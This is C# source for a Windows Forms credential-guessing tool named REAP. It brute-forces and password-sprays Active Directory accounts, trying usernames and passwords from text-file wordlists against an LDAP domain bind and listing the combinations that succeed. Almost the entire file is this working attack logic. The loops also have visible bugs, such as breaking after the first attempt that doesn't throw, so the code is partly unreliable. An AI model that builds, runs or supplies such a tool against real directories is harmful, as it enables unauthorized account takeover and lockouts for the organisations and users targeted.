using System.DirectoryServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.DirectoryServices.ActiveDirectory;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
namespace REAP
{
    public partial class REAP : Form
    {
        private SearchResultCollection searchResults; // Declared at the class level
        private int currentIndex;

        public REAP()
        {
            InitializeComponent();

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            openFileDialog1.Title = "SELECT FILE";
            openFileDialog1.Filter = "Text File (*.txt)|*.txt";
            openFileDialog1.ShowDialog();
            if (openFileDialog1.FileName != "")
            {
                textBox1.Text = openFileDialog1.FileName;
            }
            else
            {
                textBox1.Text = "YOU did not select any file";
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {

            //switch (Mychoice) 
            //{ 

            //}
            int Usercombo = comboBox1.SelectedIndex;
            int Passcombo = comboBox2.SelectedIndex;
            // switch(){
            // case "monday":
            //  folderBrowserDialog1.ShowDialog();

            if (Usercombo != null && Passcombo != null && Usercombo == 0 && Passcombo == 0)
            {
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                try
                {
                    string uname = textBox1.Text;
                    string pass = textBox2.Text;
                    string Domain = textBox3.Text;
                    using (DirectoryEntry entry = new DirectoryEntry($"LDAP://{Domain}", uname, pass))
                    {
                        using (DirectorySearcher searcher = new DirectorySearcher(entry))
                        {
                            searcher.Filter = "(&(objectClass=user)(objectCategory=person))";
                            searchResults = searcher.FindAll();
                            if (searchResults.Count > 0)
                            {
                                Results.Items.Add("Login Successfull for " + uname);
                            }
                            // else
                            // {
                            // MessageBox.Show("incorrect password for account :" + uname);
                            //}
                        }
                    }
                }
                catch (Exception ex)
                {

                    Results.Items.Add("An error occured: " + ex.Message + " error");
                }



            }
            else if (Usercombo != null && Passcombo != null && Usercombo == 1 && Passcombo == 1)
            {
                textBox1.Enabled = false;
                textBox2.Enabled = false;
                MessageBox.Show("Selected Multiple users & multiple passwords");
                try
                {
                    string[] usernames = File.ReadAllLines(openFileDialog1.FileName);
                    string[] pass = File.ReadAllLines(openFileDialog2.FileName);
                    string Domain = textBox3.Text;
                    foreach (string username in usernames)
                    {
                        foreach (string password in pass)
                        {
                            try
                            {
                                using (DirectoryEntry entry = new DirectoryEntry($"LDAP://{Domain}", username, password))
                                {
                                    using (DirectorySearcher searcher = new DirectorySearcher(entry))
                                    {
                                        searcher.Filter = "(&(objectClass=user)(objectCategory=person))";
                                        searchResults = searcher.FindAll();
                                        if (searchResults.Count > 0)
                                        {
                                            Results.Items.Add("correct password found for " + username);
                                        }

                                    }
                                }
                                break;
                            }
                            catch (Exception ex)
                            {
                                Results.Items.Add("An error occured: " + ex.Message);
                            }
                        }
                    }
                    
                }
                catch (Exception)
                {

                    throw;
                }
            }
            else if (Usercombo != null && Passcombo != null && Usercombo == 0 && Passcombo == 1)
            {
                textBox1.Enabled = true;
                textBox2.Enabled = false;
                //MessageBox.Show("Selected Single user & multiple passwords");
                try
                {
                    string username = textBox1.Text;
                    string[] pass = File.ReadAllLines(openFileDialog2.FileName);
                    string Domain = textBox3.Text;
                    foreach (string password in pass)
                    {
                        try
                        {
                            using (DirectoryEntry entry = new DirectoryEntry($"LDAP://{Domain}", username, password))
                            {
                                using (DirectorySearcher searcher = new DirectorySearcher(entry))
                                {
                                    searcher.Filter = "(&(objectClass=user)(objectCategory=person))";
                                    searchResults = searcher.FindAll();
                                    if (searchResults.Count > 0)
                                    {
                                        Results.Items.Add("correct password found for " + username);
                                    }

                                }
                            }
                            break;
                        }
                        catch (Exception ex)
                        {

                            Results.Items.Add("An error occured: " + ex.Message);
                        }

                    }
                }
                catch (Exception)
                {

                    throw;
                }
            }
            else if (Usercombo != null && Passcombo != null && Usercombo == 1 && Passcombo == 0)
            {
                textBox1.Enabled = false;
                textBox2.Enabled = true;
                try
                {
                    string[] usernames = File.ReadAllLines(openFileDialog1.FileName);
                    string pass = textBox2.Text;
                    string Domain = textBox3.Text;
                    foreach (string username in usernames)
                    {
                        try
                        {
                            using (DirectoryEntry entry = new DirectoryEntry($"LDAP://{Domain}", username, pass))
                            {
                                using (DirectorySearcher searcher = new DirectorySearcher(entry))
                                {
                                    searcher.Filter = "(&(objectClass=user)(objectCategory=person))";
                                    searchResults = searcher.FindAll();
                                    if (searchResults.Count > 0)
                                    {
                                        Results.Items.Add("correct password found for " + username);
                                    }
                                }
                            }
                            break;
                        }
                        catch (Exception ex)
                        {

                            MessageBox.Show("An error occured: " + ex.Message + " error");
                        }

                    }
                }
                catch (Exception)
                {

                    throw;
                }
            }
            else
            {
                MessageBox.Show(" None Selected or one option selected ");
            }
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            openFileDialog2.Title = "SELECT FILE";
            openFileDialog2.Filter = "Text File (*.txt)|*.txt";
            openFileDialog2.ShowDialog();
            if (openFileDialog2.FileName != "")
            {
                textBox2.Text = openFileDialog2.FileName;
            }
            else
            {
                textBox2.Text = "YOU did not select any file";
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
